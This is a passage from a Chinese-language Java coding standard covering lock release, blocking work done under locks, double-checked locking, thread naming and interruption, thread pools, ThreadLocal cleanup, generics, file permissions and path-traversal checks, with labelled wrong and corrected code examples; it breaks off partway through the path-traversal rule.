一个线程中没有正确释放持有的锁会导致其他线程无法获取该锁对象，导致阻塞。在发生异常时，需要确保程序正确释放当前持有的锁。在异常条件下，同步方法或者块同步中使用的对象内置锁会自动释放。但是大多数的Java锁对象并不是Closeable，无法使用try-with-resources功能自动释放，在这种情 况下需要主动释放锁。

【反例】（可检查异常）

```java
public final class Foo {
    private final Lock lock = new ReentrantLock();
    
    public void incorrectReleaseLock() {
        try {
            lock.lock();
            doSomething();
            lock.unlock();
        } catch (MyBizException ex) {
			// 处理异常
        }
    }
    
    private void doSomething() throws MyBizException {
		...
    }
}
```

上述示例中，使用了 `ReentrantLock` 锁，当 `doSomething()` 方法抛出异常时，catch代码块中没有释放锁操作，导致锁没有释放。

【正例】

```java
public final class Foo {
    private final Lock lock = new ReentrantLock();
    
    public void correctReleaseLock() {
        lock.lock();
        try {
            doSomething();
        } catch (MyBizException ex) {
			// 处理异常
        } finally {
            lock.unlock();
        }
    }
    
    private void doSomething() throws MyBizException {
		...
    }
}
```

上述示例中，成功执行锁定操作后，将可能抛出异常的操作封装在try代码块中。锁在执行try代码块前 获取，可保证在执行finally代码时正确持有锁。在finally代码块中调用 `lock.unlock()` ，可以保证不管 是否发生异常都可以释放锁。

【反例】（未检查异常）

```java
final class Foo {
    private final Lock lock = new ReentrantLock();
    
    public void incorrectReleaseLock(String value) {
        lock.lock();
		...
        int index = Integer.parseInt(value);
		...
        lock.unlock();
    }
}
```

上述示例中，当 `incorrectReleaseLock()` 方法传入的String不是数字时，后续的操作会抛出 `NumberFormatException` ，导致锁未被正确释放。

【正例】

```java
final class Foo {
    private final Lock lock = new ReentrantLock();
    
    public void correctReleaseLock(String value) {
        lock.lock();
        try {
			...
            int index = Integer.parseInt(value);
			...
        } finally {
            lock.unlock();
        }
    }
}
```

上述示例中，成功执行锁定操作后，将可能抛出异常的操作封装在try代码块中。锁在执行try代码块前 获取，可保证在执行finally代码时正确持有锁。在finally代码块中调用 `lock.unlock()` ，可以保证不管 是否发生异常都可以释放锁。

> G.CON.03 避免在持有锁时执行耗时或阻塞性的操作

【级别】 建议

【描述】

持有锁时执行耗时或阻塞性操作会严重降低系统性能，可能导致线程饥饿。此外还可能会导致依赖本线 程的其他线程无限期阻塞。

阻塞性操作包括网络、文件、控制台I/O和对象序列化等，线程无限期的等待也属于阻塞性的操作。

程序应该避免在持有锁的时候执行阻塞性的操作。阻塞操作如果支持超时机制（如 `java.net.Socket.connect()`、`java.util.concurrent.Future.get()`、 `javax.jms.MessageConsumer.receive()`等），应该为该阻塞操作设置合理的超期时间。

【反例】

```java
private List<Message> messageBuff = new ArrayList[MAX_BUFF_SIZE];

public void sendMessage(Socket socket, String targetUid) throws IOException {
    try (ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream())) {
        synchronized(messageBuff) {
            Iterator<Message> iterator = messageBuff.iterator();
            while (iterator.hasNext()) {
                Message message = iterator.next();
                if (message.getTargetUid().equals(targetUid)) {
                    out.writeObject(message);
                    iterator.remove();
                }
            }
        }
    }
}
```

上述示例中，定义了一个 `sendMessage` 的方法，加 `synchronized` 的目的是为了多线程并发场景下， 保护 `messageBuff`。但是 `writeObject` 方法是一个网络IO操作，属于阻塞性操作，在高时延、网络丢包的情况下会导致线程的长时间等待，就像死锁一样。

【正例】

```java
private List<Message> messageBuff = new ArrayList[MAX_BUFF_SIZE];

public void sendMessage(Socket socket, String targetUid) throws IOException {
    List<Message> candidateMessage = getCandidateMessage(targetUid);
    if (!candidateMessage.isEmpty()) {
        writeMessageToStream(socket, candidateMessage);
    }
}

public List<Message> getCandidateMessage(String targetUid) {
    List<Message> candidates = new ArrayList<>();
    synchronized (messageBuff) {
        Iterator<Message> iterator = messageBuff.iterator();
        while (iterator.hasNext()) {
            Message msg = iterator.next();
            if (msg.getTargetUid().equals(targetUid)) {
                candidates.add(msg);
                iterator.remove();
            }
        }
    }
    return candidates;
}

public void writeMessageToStream(Socket socket, List<Message> messages)
    throws IOException {
    try (ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream())) {
        for (Message message : messages) {
            out.writeObject(message);
        }
    }
}
```

上述示例中，把处理方法分成两个部分，在 `getCandidateMessage` 方法中完成对 `messageBuff` 的加锁访问，然后调用不需要同步的 `writeMessageToStream` 方法，完成IO操作。

【反例】

```java
public synchronized Socket connect(String ip, int port) {
    try {
        Socket socket = new Socket();
        socket.connect(new InetSocketAddress(ip, port));
        return socket;
    } catch (IOException ex) {
        ...
    }
    ...
}
```

上述示例中，在同步方法中建立socket链接，由于 `connect()` 方法未设置超时时间，服务端socket无法正常listen，会导致此方法一致阻塞。

【正例】

```java
public synchronized Socket connect(String ip, int port) {
    try {
        Socket socket = new Socket();
        socket.connect(new InetSocketAddress(ip, port), 10000);
        return socket;
    } catch (IOException ex) {
        ...
    }
    ...
}
```

上述示例中，在同步方法中建立socket链接时， `connect()`方法设置超时时间为10秒。

【反例】（加锁期间执行Sleep操作）

```java
public synchronized void doSomething() {
	...
    try {
        Thread.sleep(INTERVAL);
    } catch (InterruptedException ex) {
        ...
    }
    ...
}
```

上述示例中，在同步方法中执行 `sleep()` 方法，该操作会让出该线程的CPU执行权，但是对于其他需要执行 `doSomething()` 方法的线程会因为无法获取到锁而阻塞。加锁期间应避免执行sleep操作。

【例外】

对外提供了终止阻塞操作的方法，可以对该阻塞操作使用锁进行同步。

> G.CON.04 避免使用不正确形式的双重检查锁

【级别】 要求

【描述】

双重检查锁（double-checked locking）是一种软件设计模式，通常用于延迟初始化单例。主要通过在进行获取锁之前先检查单例对象是否创建（第一次检查），在获取锁以后，再次检查对象是否创建（第二次检查），以此减少并发获取锁的开销。

但是不正确的使用双重检查锁，存在延迟初始化的Java优化问题隐患。也就是会导致一个线程发布一个未初始化或部分初始化的对象给另外的线程使用。

【反例】

```java
final class Singleton {
    private static Singleton instance = null;
    private static final Object LOCK = new Object();
    
    private Singleton() {
		...
    }
    
    public static Singleton getSingletonInstance() {
        if (instance == null) {
            synchronized (LOCK) {
                if (instance == null) {
                    instance = new Singleton();
                }
            }
        }
        return instance;
    }
}
```

上述示例中，当一个线程完成对成员属性 `instance` 的赋值时，并未完成对象的完全初始化，也就是说此时另外一个并发线程调用 `getSingletonInstance()` 会得到一个指向 `Singleton` 对象的非空引用， 然而该对象的数据成员可能是默认值，而不是构造方法中设置的值。

【正例】

```java
final class Singleton {
    private static volatile Singleton instance = null;
    private static final Object LOCK = new Object();
    
    private Singleton() {
		...
    }
    
    public static Singleton getSingletonInstance() {
        if (instance == null) {
            synchronized (LOCK) {
                if (instance == null) {
                    instance = new Singleton();
                }
            }
        }
        return instance;
    }
}
```

上述示例中，把 `instance` 声明为 `volatile` ，当一个线程初始化 `Singleton` 对象时，会在这个线程和其他任何获取该实例的线程之间建立起happens-before关系。避免使用到未初始化完全的对象引用。

> G.CON.05 禁止使用非线程安全的方法来覆写线程安全的方法

【级别】 要求

【描述】 对于线程安全的方法，如果子类将其覆写为非线程安全的方法，可能会导致不正确的同步，导致难以定位的问题产生。

【反例】（同步方法）

```java
class SeniorClass {
    public synchronized void doSomething() {
		...
    }
}

class JuniorClass extends SeniorClass {
    @Override
    public void doSomething() {
		...
    }
}
```

上述示例中， `doSomething()` 在被子类覆写时，改为了非线程安全的方法。

【正例】

```java
class SeniorClass {
    public synchronized void doSomething() {
		...
    }
}

class JuniorClass extends SeniorClass {
    @Override
    public synchronized void doSomething() {
		...
    }
}
```

> G.CON.06 使用新并发工具代替 `wait()` 和 `notify()`

【级别】 要求

【描述】

Java 5开始提供了更高级的并发工具，这些工具可以有效替代 `wait()` 和 `notify()` 。新开发的代码应该优先使用这些并发工具。

这些高级的并发工具主要位于 `java.util.concurrent` 中，包括：

- Executor Framework：可参考G.CON.12 避免不加控制地创建新线程，应该使用线程池来管控资源；
- 并发集合（Concurrent Collection）：提供了高性能的并发实现的集合接口，在其内部实现了同步管理，不需要额外加锁，常用的并发集合包括 `ConcurrentHashMap` 、 `ConcurrentSkipListSet` 、 `ConcurrentLinkedQueue` 等；
- 同步器（Synchronizer）：为每种特定的同步需求提供了解决方案，常用的同步器包括 `Phaser` 、`CountDownLatch`、`Semaphore` 等。

【反例】

```java
public static void main(String[] args) {
    try {
        ...
        Object lock1 = new Object();
        Object lock2 = new Object();
        Thread thread1 = new Thread(() -> doSomething(lock1, lock2));
        Thread thread2 = new Thread(() -> doSomething(lock1, lock2));
        thread1.join();
        thread2.join();
        thread1.start();
        thread2.start();
    }catch(InterruptedException ex) {
        ...
    }
}

private static void doSomething(Object lock1, Object lock2) {
    ...
        synchronized (lock1) {
        ...
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                ...
            }
        synchronized (lock2) {
            ...
                try {
                    lock1.wait();
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    ...
                }
            lock1.notify();
        }
    }
}
```

上述示例中，存在锁死的问题。

【例外】

原来用 `wait()` 和 `notify()` 写的老代码无功能问题，可以保留。

#### 3.8.3 线程API

> G.CON.07 创建新线程时必须指定线程名

【级别】 要求

【描述】

推荐使用线程池管理线程，有些场景必须单独创建线程时，应遵循本规则。指定线程名可以给问题定位带来很多方便。日志或者dump文件中会包含线程的名字，但缺省的线程名Thread-n无法区分出是哪个线程，不便于问题定位。

【正例】

```java
public class MyThread extends Thread {
    public MyThread() {
        super.setName("MyThreadName");
		...
    }
}
```

> G.CON.08 使用`Thread`对象的 `setUncaughtExceptionHandler` 方法注册未捕获异常处理者

【级别】 要求

【描述】

Java多线程程序中，所有线程都不允许抛出未捕获的checked exception，也就是说各个线程需要自己把自己的checked exception处理掉。但是无法避免未捕获的 `RuntimeException` 。当子线程抛出异常时，子线程会结束，但主线程不会知道，因为主线程通过try-catch是无法捕获子线程异常的。

Thread对象提供了 `setUncaughtExceptionHandler` 方法用来获取线程中产生的异常。还可以使用 `Thread.setDefaultUncaughtExceptionHandler`，为所有线程设置默认异常处理方法。

应注意的是，在执行周期性任务例如 `ScheduledExecutorService` 时，为了程序的健壮性，可考虑在提交的`Runnable`的`run`方法内捕获高层级的异常。

`ScheduledExecutorService` 的各种 `schedule` 方法，可以通过其返回的 `ScheduledFuture` 对象获取 其异常。

【正例】

```java
public class TestUncaughtException {
    public static void main(String[] args) {
        TestThread thread = new TestThread("meaningful-name");
        thread.setUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
            @Override
            public void uncaughtException(Thread tr, Throwable ex) {
                System.out.println(tr.getName() + " : " + ex.getMessage());
            }
        });
        thread.start();
    }
    
    public static class TestThread extends Thread {
        public TestThread(String name) {
            super.setName(name);
        }
        @Override
        public void run() {
            throw new RuntimeException("just a test");
        }
    }
}
```

【例外】

在Android Framework等能完整捕获 `UncaughtException` 的情况下，可以不通过 `setUncaughtExceptionHandler` 注册异常处理者。

> G.CON.09 不要依赖线程调度器、线程优先级和`yield()`方法

【级别】 要求

【描述】

Java中的线程调度，是基于操作系统以及JVM的实现，在不同的操作系统中，或者不同厂商的JVM（如 Oracle、IBM等），即使是同一套代码，其多线程的调度机制也是不一样的。因此，在多线程的程序中，不要依赖于系统的线程调度器来决定程序的逻辑运作，如果程序依赖于线程调度器来达到正确性或者性能要求，会导致不可移植。

线程的优先级是高度依赖于系统的。当虚拟机依赖于系统的线程实现机制时，Java线程的优先级会被映射到系统的线程优先级上，Java线程优先级的数量会发生变化，甚至可能被忽略。所以程序功能的正确 性不能依赖于线程的优先级。

而 `Thread.yield()` 对线程调度器仅仅是个提示，不保证确定的效果，因此代码也不能依赖 `Thread.yield()` 方法。

> G.CON.10 线程中断由业务代码来协作完成，慎用 `Thread.interrupt()` 方法

【级别】 建议

【描述】

优先使用协作式的线程同步机制来通知一个线程中止作业，如`java.util.concurrent`包中的各种 `synchronizer`，加锁的共享变量、`volatile`共享变量等。

如果需要一个线程让另一个线程中止执行，[Java API](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/doc-files/threadPrimitiveDeprecation.html)推荐的方式是，让被中止的线程在运行中周期性地查询自己是否被中止。如果发现自己被中止，则应该主动清理状态并中止执行，而不是忽略请求继续执行。

【正例】 轮询状态，满足退出条件时结束线程。

```java
class Job implements Runnable {
    boolean shouldStop() {
		...
    }
    
    @Override
    public void run() {
        while (!shouldStop()) {
            doWork();
        }
    }
}
```

但要注意：**不可以使用非volatile变量作为通知用的变量**。下面的代码中，对 `hasStopRequested` 的访 问没有任何同步，变量的写和读操作之间没有happens-before关系，Java Memory Model允许读操作 读到任何一次写入的值，包括初值false。所以即使每次都读到false，也是一个合法的执行结果。优化 器有可能直接将 `while (!hasStopRequest)` 替换成 `while (!false)` ，循环将永远无法中止，而且这是合法的优化。将 `hasStopRequested` 改成`volatile`后，如果其他线程将该变量赋值为true，Job的线程 可以马上看到修改结果。

【反例】 使用非`volatile`变量进行通信，存在data race。将 `hasStopRequested` 改为`volatile`即可修正。

```java
class Job implements Runnable {
    private boolean hasStopRequested; // 不是volatile，不能作为通信变量使用

    // private volatile boolean hasStopRequested; // 改为volatile即可修正问题
    public void requestStop() {
        hasStopRequested = true;
    }

    @Override
    public void run() {
        // hasStopRequested非volatile读，无happens-before关系。有可能每次都读到初值false
        while (!hasStopRequested) {
            doWork();
        }
    }
}
```

慎用 `Thread.interrupt`方法，它依赖执行线程对interrupted status的处理逻辑。

在使用 `Thread.interrupt()` 方法请求目标线程中止时，仅仅是在目标线程上将interrupted status标记 为 true ，目标线程本身需用 `Thread.interrupted()` 方法检查该标记，当状态为 true 时，应主动执 行清理，并抛出 `InterruptedException` 。注意： `Thread.interrupted()` 会清除interrupted status（即重置为 false ），`Thread.currentThread().isInterrupted()` 不会清除线程的 interrupted status。

当应用 `Thread.interrupt` 方法时，注意如下用法。

检测到当前线程被interrupt后，应抛出 `InterruptedException` ，并在finally或try-with-resource中清 理执行状态。`InterruptedException`应不断上抛，直至线程中止。因此，根据Java语法，能抛出此异常的方法要标注 `throws InterruptedException`。但如果因为实现指定的接口（如线程入口 `Runnable.run()` ）而无法抛出 `InterruptedException`，则按接口要求特殊处理。记住，调用 `Thread.interupt()` 的线程希望当前线程尽快停止。

【正例】（使用interrupt中止线程执行）

```java
public static long runThread1(long max) throws InterruptedException { // 标注throws
    long result = 0L;
    for (long i = 0L; i < max; i++) {
        result += i;
        if (Thread.interrupted()) { // 周期性检查自己是否被interrupt
            throw new InterruptedException("Interrupted during summing"); // 主动中止
        }
    }
    return result;
}

public static void main(String[] args) throws Exception {
    Thread thread1 = new Thread(() -> {
        try {
            long result = runThread1(100000000L);
            LOGGER.log(result);
        } catch (InterruptedException ex) {
            // 线程顶层方法，实现Runnable，不处理，正常中止。
            LOGGER.log("worker thread stopped"); // 可以记录日志。
        }
    }, "meaningful-name");
    thread1.start();
    Thread.sleep(1000);
    thread1.interrupt(); // 用interrupt()方法请求中止
    thread1.join();
}
```

**在使用**`Thread.interrupt()`**方法来终止线程时，必须清楚目标线程的中断逻辑并以正确的方式处理相关问题**

在NIO的一些场景下，调用`Thread.interrupt()`方法会使文件句柄被强制关闭，注意此时的文件句柄不是 被程序调close方法关闭的，程序是不知道文件句柄已经被关闭了，如果其他地方继续调用文件的其他方法，就会导致莫名奇妙的IO异常。强制关闭文件句柄的代码参见： java.nio.channels.spi.AbstractInterruptibleChannel#begin。

在编写需要中止的多线程程序时，必须选用能够响应interrupt的标准库或第三方库。Java标准库中的会阻塞的方法（如 `Thread.sleep()` 或者 `SocketChannel.write()` ）一般会在interrupt之后抛出 `InterruptedException` 。但有些方法则不理会interrupt，如 `Socket.write()` ，必须回避这些方 法。

【反例】

`java.net.Socket`类的方法阻塞时不响应interrupt！写多线程程序时必须回避这些类。

```java
private void socketSendBad(InetSocketAddress addr, byte[] data) throws IOException {
    try (Socket cs = new Socket()) {
        cs.connect(addr); // 阻塞时不响应interrupt
        cs.getOutputStream().write(data); // 阻塞时不响应interrupt
    }
}
```

【正例】

改用可以响应interrupt的 `java.nio.channels.SocketChannel`

```java
private void socketSend(InetSocketAddress addr, ByteBuffer buf) throws InterruptedException, IOException {
    // 如果在open时interrupt，会抛出ClosedByInterruptException
    try (SocketChannel sc = SocketChannel.open(addr)) {
        sc.write(buf); // 如果在write时interrupt，会抛出ClosedByInterruptException
    } catch (ClosedByInterruptException ex) {
        throw new InterruptedException("Interrupted while sending");
    } // 即使继续抛出InterruptedException，try-with-resources块也会在这里自动关闭SocketChannel
}
```

> G.CON.11 禁止使用 `Thread.stop()` 来终止线程

【级别】 要求

【描述】 `Thread.stop()` 已经被标记为`@Deprecated`，该方法是不安全的，调用 `Thread.stop()` 来终止线程 会使其释放它所持有的所有锁，可能会导致这些锁保护的对象处于不一致的状态。

【正例】（设置线程结束标志）

```java
public final class Foo implements Runnable {
    private volatile boolean shouldAbort = false;
    
    public void stop() {
        shouldAbort = true;
    }
    
    @Override
    public void run() {
		...
        while (!shouldAbort) {
			...
        }
    }

    public static void main(String[] args){
        Foo foo = new Foo();
        Thread thread = new Thread(foo);
        thread.start();
		...
        foo.stop();
    }
}
```

上述示例中，使用一个标志来请求线程终止。

#### 3.8.4 线程池

> G.CON.12 避免不加控制地创建新线程，应该使用线程池来管控资源

【级别】 建议

【描述】

Java虚拟机能够管理的线程数量有限，不加控制的创建新线程可能会导致Java虚拟机崩溃。

推荐使用Java 5之后提供的线程池 `ThreadPoolExecutor`来管理线程资源，这样可以更加明确线程池的运行规则，避免资源耗尽的风险。另外，线程池要合理规划，避免任意重复创建。

不推荐使用 `Executors` 创建线程池，因为存在以下问题：

1） `Executors.newFixedThreadPool()` 和 `Executors.newSingleThreadExecutor()` 允许请求队列的最大长度为 `Integer.MAX_VALUE`，可能会因为堆积大量的请求导致OOM。

2） `Executors.newCachedThreadPool()` 允许创建线程的最大数量为 `Integer.MAX_VALUE`，可能会因为创建大量的线程导致OOM。`Executors.newScheduledThreadPool()`会自动增长工作队列大小。 `Executors.newWorkStealingPool()`实际的工作窃取线程数量会动态地增减。

【反例】

```java
public void processEntity1(List<Entity> items) {
    for (Entity entity : items) {
        new Thread(new EntityProcessor(entity)).start();
    }
}
```

【正例】

使用线程池来管理线程资源，对线程池指定核心线程数，最大线程数，工作队列大小，线程工厂及丢弃 策略等参数。

```java
private BlockingQueue blockingQueue = new LinkedBlockingQueue(100);
private ThreadPoolExecutor threadPool 
    = new ThreadPoolExecutor(2, 
                             64, 
                             60L,
                             TimeUnit.SECONDS, 
                             blockingQueue,
                             new SelfThreadFactory("ProductName", "ThreadName", false),
                             new DiscardOldestPolicy(LOGGER, "ThreadName"));

public void processEntity2(List<Entity> items) {
    for (Entity entity : items) {
        threadPool.execute(new EntityProcessor(entity));
    }
}
```

> G.CON.13 线程池中的任务结束后必须清理其自定义的 `ThreadLocal` 变

【级别】 要求

【描述】

`ThreadLocal` 基于弱引用实现，如果线程栈随着线程一起被JVM回收，`ThreadLocal`中存放的值也会 在之后的GC被回收。而线程池技术则会重复使用线程以减少线程创建开销。

这种线程的复用，导致`ThreadLocal`变量的使用存在以下两类问题：

- 脏数据问题：当前任务未正确初始化`ThreadLocal`变量，导致`ThreadLocal`变量取到该线程之前 执行的某一个任务中设置的未清除的值；
- 内存泄露问题：任务中没有手工清理`ThreadLocal`中存放的值，且该线程池中的核心线程持有了`ThreadLocal`的引用，使得 `ThreadLocal`中的值对象不会被JVM主动释放，最终造成这一片内存无法被回收导致内存泄露。

因此必须保证线程池中每个任务使用的`ThreadLocal`变量在任务结束后被主动清理。

一些常见的涉及线程池的场景包括但不限于：

1. 使用JDK或第三方线程池工具类提交异步任务：`ThreadPoolExecutor`、`ForkJoinPool`、来自 Guava 的增强线程池（通常继承自 `ListeningExecutorService`）、来自 Spring 的异步线程池`org.springframework.core.task.TaskExecutor`等；
2. 基于线程池进行任务执行的框架或工具：JDK中的`java.util.Collection#parallelStream`（该接口默认复用 `ForkJoinPool.commonPool()`）、Netty的`io.netty.channel.ChannelPipeline`中的`addAfter`和`addFirst`（使用线程池提交handler）、以及Tomcat/Jetty中的请求处理线程池 等；

【正例】

```java
public class TestThreadLocal {
    public static void main(String[] args) {
        ThreadPoolExecutor pool = new ThreadPoolExecutor(1, 
                                                         2, 
                                                         100,
                                                         TimeUnit.MILLISECONDS, 
                                                         new LinkedBlockingQueue<Runnable>(),
                                                         Executors.defaultThreadFactory(), 
                                                         new ThreadPoolExecutor.CallerRunsPolicy());
        for (int i = 0; i < 20; i++) {
            pool.execute(new TestThreadLocalTask());
        }
    }
}

class TestThreadLocalTask implements Runnable {
    private static ThreadLocal<Integer> localValue = new ThreadLocal<>();
    
    @Override
    public void run() {
        localValue.set(STATE1);
        try {
			...
            localValue.set(STATE3);
			...
        } finally {
            localValue.remove(); // 需要执行remove方法清理线程局部变量，避免内存泄露
        }
    }
}
```

### 3.9 泛型和集合

在集合中优先使用泛型。

在使用 `Collectors.toMap()` 方法时，要注意两个问题：当出现相同key时会抛出`IllegalStateException` ；当value为null时会抛出 `NullPointerException` 。

使用 `Arrays.asList()` 方法将数组转为集合时，生成的集合不支持添加、删除元素操作；对数组或集合中的元素进行修改，会导致对方同步更新。

`Collections`类可以生成immutable的Set、List、Map，对于这些集合不能进行添加/删除元素操作。

调用List的 `subList()` 方法生成的子List，与原List存在关联关系：对于任一list的修改都可能会导致另一方同步修改；对原List的增删操作可能会导致对子List操作时抛出`ConcurrentModificationException` 。

集合的 `addAll()` 方法如果入参为null会抛出 `NullPointerException` ，应保证传入的集合不为null。

> G.COL.01 方法的设计可优先考虑泛型

【级别】 建议

【描述】

使用泛型的优点包括：可以使代码更简洁，最大限度地重用代码；保护类型的安全；消除强制类型转换。如果可能应尽量使用泛型方法。

静态方法如果要使用泛型，由于静态方法无法访问类上定义的泛型，必须将静态方法定义成泛型方法。

如果方法中有多个（3个以上）对类型的 `instanceof` 判断分类处理，也可以考虑使用泛型。

【正例】

泛型方法就像泛型一样，使用起来比要求客户端转换输入参数并通过返回值返回的方式更加安全，也更加容易。

```java
public static <E> List<E> union(List<E> list1, List<E> list2) {
    List<E> resultList = new ArrayList<>(list1.size() + list2.size());
    resultList.addAll(list1);
    resultList.addAll(list2);
    return resultList;
}
```

> G.COL.02 优先使用泛型集合，而不是数组

【级别】 建议

【描述】

泛型是不可变的，数组是协变的。当向数组中添加类型不匹配的元素时，在运行期才会发生错误，而对于集合，在编译期就会报错。另外，由于类型不安全无法创建泛型数组。

泛型与数组不能很好地混合使用，如果需要使用一个“泛型化的数组”，更好地选择是使用列表。

【反例】

```java
private final T[] someArray; // 泛型数组，不建议
private final Object[] objArray; // 协变化的数组声明，不建议

Object[] objectArray = new Integer[10]; // 协变化的数组初始化，不建议
objectArray[0] = "test value"; // 运行时抛出ArrayStoreException
```

上述示例中，代码是合法的，但运行时会报错。

【正例】

```java
private final List<T> lists; // 泛型列表
private final List<String> longs; // 具体化的列表

List<Object> objectList = new ArrayList<String>(DEFAULT_CAPACITY); // 不兼容类型，编译报错
objectList.add("test value");
```

上述示例中，因为类型不匹配会在编译时报错。 常见的数组用法是允许的，例如：

 具体化的数组： 

```java
String[] args = ...;
Address[] addrs = ...;
```

基本类型数组： `byte[] data`、`float[] points` 。 

> G.COL.03 声明一个泛型类通过限定符限制可用的泛型类型

【级别】 建议

【描述】

Java的泛型可按 PECS(Producer Extends，Consumer Super) 原则来设计上界和下界类型。声明一个带泛型的类或接口的时候，建议限制可以用的泛型类型，避免接口使用者乱用。

`<? extends T>`实现了泛型的协变，表现在泛型集合中，适合从集合中读取元素，不能添加元素。`<? super T>`实现了泛型的逆变，表现在泛型结合中，适合向集合中添加元素，不适合读取元素。`Collections`的 `public static void copy(List dest, List src)` 是一个典型的使用场景。

> G.COL.04 不要在 `foreach` 循环中通过 `remove()` / `add()` 方法更改集合

【级别】 要求

【描述】

`java.util.concurrent`包之外的（非concurrent）集合在 `foreach` 循环中不要更改，否则可能会导致 `ConcurrentModificationException` 。

当需要遍历集合并删除部分元素时，可采用 `removeIf()` 方法 或 `Iterator` 的 `remove()`方法。个别集合（例如 `CopyOnWriteArrayList`）的 `Iterator` 中 `remove()` 方法会抛出 `UnsupportedOperationException`。

【反例】

以下代码，某些场景下可正常删除集合中的元素，但大部分场景下会抛出 `ConcurrentModificationException`。

```java
for (String item : list) {
    if (shouldDelete(item)) {
        list.remove(item);
    }
}
```

【正例】

```java
// 使用Java 8 Collection中的removeIf方法
list.removeIf(item -> shouldDelete(item));

// 使用Iterator删除元素
Iterator<String> iterator = list.iterator();
while (iterator.hasNext()) {
    String item = iterator.next();
    if (shouldDelete(item)) {
        iterator.remove();
    }
}
```

### 3.10 输入输出

> P.04 在多用户系统中创建文件时指定合适的访问许可

【描述】 在多用户系统中创建文件时，如果不显式指定合适访问权限，可能会让未经授权的用户访问该文件，造成信息泄露，文件数据被篡改，文件中被注入恶意代码等风险。因此，一定要在创建文件时就为其指定访问权限，以防止未授权的文件访问。系统中各类文件的访问权限应在设计阶段进行规划，未规划时可参考 安全功能规范。

【补充：安全功能规范】

系统中包含敏感信息的文件/目录，要进行严格的权限控制，除了other组用户外，也应限制同组用户的访问权限。这里的文件/目录包含应用程序运行时产生的静态数据文件（如状态报告）以及临时文件，若包含敏感数据则必须有相应的访问控制措施。创建临时文件时，应在具有访问权限控制的目录下创建，禁止在不安全的目录中创建临时文件（如/tmp），每次生成不同的临时文件名，并定期清除临时文件。

| 文件类型                           | 设置值           |
| ---------------------------------- | ---------------- |
| 用户主目录                         | 750（rwxr-x---） |
| 程序文件(含脚本文件、库文件等)     | 550（r-xr-x---） |
| 程序文件目录                       | 550（r-xr-x---） |
| 配置文件                           | 640（rw-r-----） |
| 配置文件目录                       | 750（rwxr-x---） |
| 日志文件(记录完毕或者已经归档)     | 440（r--r-----） |
| 日志文件(正在记录)                 | 640（rw-r-----） |
| 日志文件目录                       | 750（rwxr-x---） |
| Debug文件                          | 640（rw-r-----） |
| Debug文件目录                      | 750（rwxr-x---） |
| 临时文件目录                       | 750（rwxr-x---） |
| 维护升级文件目录                   | 770（rwxrwx---） |
| 业务数据文件                       | 640（rw-r-----） |
| 业务数据文件目录                   | 750（rwxr-x---） |
| 密钥组件、私钥、证书、密文文件目录 | 700（rwx—----）  |
| 密钥组件、私钥、证书、加密密文     | 600（rw-------） |
| 加解密接口、加解密脚本             | 500（r-x------） |

【正例】（Linux情况）

```java
Path file = new File("file").toPath();
// 抛出异常而不是覆写已存在的文件
Set<OpenOption> options = new HashSet<OpenOption>();
options.add(StandardOpenOption.CREATE_NEW);
options.add(StandardOpenOption.APPEND);
// 文件权限应设置为只有属主才能读取/写入文件
Set<PosixFilePermission> perms = PosixFilePermissions.fromString("rw-------");
FileAttribute<Set<PosixFilePermission>> attr = PosixFilePermissions.asFileAttribute(perms);
try (SeekableByteChannel sbc = Files.newByteChannel(file, options, attr)) {
... // 写数据
}
```

【正例】（Windows情况）

```java
private static void fileAcl() throws IOException {
    Path path = new File("D:/aa.txt").toPath();
    
    Set<OpenOption> options = new HashSet<OpenOption>();
    options.add(StandardOpenOption.CREATE);
    options.add(StandardOpenOption.WRITE);
    
    UserPrincipalLookupService service = path.getFileSystem().getUserPrincipalLookupService();
    UserPrincipal user = service.lookupPrincipalByName("Users");
    UserPrincipal systemGroup = service.lookupPrincipalByGroupName("SYSTEM");
    
    // 创建新的条目
    final AclEntry entry = AclEntry
        .newBuilder()
        .setType(AclEntryType.ALLOW)
        .setPrincipal(user)
        .setPermissions(AclEntryPermission.READ_DATA,
                        AclEntryPermission.READ_ATTRIBUTES,
                        AclEntryPermission.READ_NAMED_ATTRS,
                        AclEntryPermission.READ_ACL,
                        AclEntryPermission.WRITE_DATA,
                        AclEntryPermission.APPEND_DATA,
                        AclEntryPermission.WRITE_ATTRIBUTES,
                        AclEntryPermission.WRITE_NAMED_ATTRS,
                        AclEntryPermission.WRITE_ACL,
                        AclEntryPermission.SYNCHRONIZE).build();
    
    final AclEntry entrySystem = AclEntry
        .newBuilder()
        .setType(AclEntryType.ALLOW)
        .setPrincipal(systemGroup)
        .setPermissions(AclEntryPermission.READ_DATA,
                        AclEntryPermission.READ_ATTRIBUTES,
                        AclEntryPermission.READ_NAMED_ATTRS,
                        AclEntryPermission.WRITE_DATA).build();
    
    FileAttribute<List<AclEntry>> aclattrs = new FileAttribute<List<AclEntry>>() {
        public String name() {
            return "acl:acl";
        } // Windows ACL
        
        public List<AclEntry> value() {
            ArrayList<AclEntry> list = new ArrayList<AclEntry>();
            list.add(entry);
            list.add(entrySystem);
            return list;
        }
    };
    
    ByteBuffer buffer = ByteBuffer.allocate(1024);
    final String strData = "abc";
    byte[] bytes = strData.getBytes(StandardCharsets.UTF_8);
    buffer.put(bytes);
    try {
        SeekableByteChannel sbc = Files.newByteChannel(path, options, aclattrs);
        //... // 写入数据
        sbc.write(buffer);
    } catch (IOException ex) {
        // 处理异常
    }
}
```

Java 7的NIO2包（java.nio）中提供了一些类来管理文件访问许可。另外，许多方法和构造器在创建文 件时可以接受一个用来指定文件访问许可的参数， `Files.newByteChannel()` 方法可以用来创建一个 文件，并规定其访问许可。

> G.FIO.01 使用外部数据构造的文件路径前必须进行校验，校验前必须对文件路径 进行规范化处理

【级别】 要求

【描述】

使用外部数据构造文件路径时，必须对其合法性进行校验，否则可能会产生路径遍历（Path Traversal）漏洞。

文件路径有多种表现形式，如绝对路径、相对路径，路径中可能会含各种链接、快捷方式、影子文件 等，这些都会对文件路径的校验产生影响，所以在文件路径校验前要对文件路径进行规范化处理。对文 件路径的规范化处理必须使用 `getCanonicalPath()` ，禁止使用 `getAbsolutePath()` （该方法无法保 证在所有的平台上对文件路径进行正确的规范化处理）。

综上所述，针对使用外部数据构造的文件路径，要按顺序执行如下两个步骤，保证代码中不存在路径遍 历漏洞：

